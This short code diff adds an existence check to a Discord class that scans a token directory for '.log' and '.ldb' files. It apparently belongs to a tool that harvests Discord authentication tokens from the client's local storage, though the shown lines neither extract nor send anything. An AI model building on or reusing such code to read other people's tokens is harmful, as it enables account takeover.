@@ -40,6 +40,9 @@ class Discord:
         invalid = []
         tokens = []
 
+        if not path.exists(self.config.TokensPath):
+            return
+
         for file in listdir(self.config.TokensPath):
 
             if file[-4:] not in [".log", ".ldb"]:
